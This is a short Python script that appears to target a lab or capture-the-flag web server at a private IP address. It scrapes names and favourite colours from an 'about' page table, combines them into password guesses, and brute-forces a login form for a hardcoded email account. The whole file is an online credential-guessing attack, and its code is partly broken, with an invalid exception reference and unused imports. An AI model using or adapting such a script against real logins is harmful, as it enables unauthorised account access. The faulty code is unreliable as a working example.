#!/usr/bin/python3
#object
from cmath import e
from distutils.extension import Extension
from logging import exception
from urllib.error import HTTPError
from bs4 import BeautifulSoup
import requests
import pandas as pd
ip="192.168.184.68"
port=":8080"

about="http://"+ip+port+"/about.html"
login="http://"+ip+port+"/login-3/"

reqAbout=requests.get(about)
reqlogin=requests.get(login)

df=pd.read_html(reqAbout.content)
parse=df[0].to_dict()
#print(df[-1].head(1))
#print(reqlogin.content)

emails=parse.get("Email")
colors=parse.get("Favorite Color")
firstnames=parse.get("First Name")

for i in emails:
    firstname=firstnames.get(i)
    for k in set(colors.values()):
        color=k
        info={
            "username": "dvaliant@bedlamdynamics.com",
            "password": firstname+color.capitalize()+firstname+color.capitalize()

        }
        try:
            reqLogin=requests.post(login,data=info)
            reqLogin.raise_for_status()
            for k,v in info.items():
                print("trying"+k+" : "+v)
            if "Password Invalid" not in reqLogin.text:
                print(reqLogin.text)
        except requests.exception.HTTPError as err:
            print(err)

    
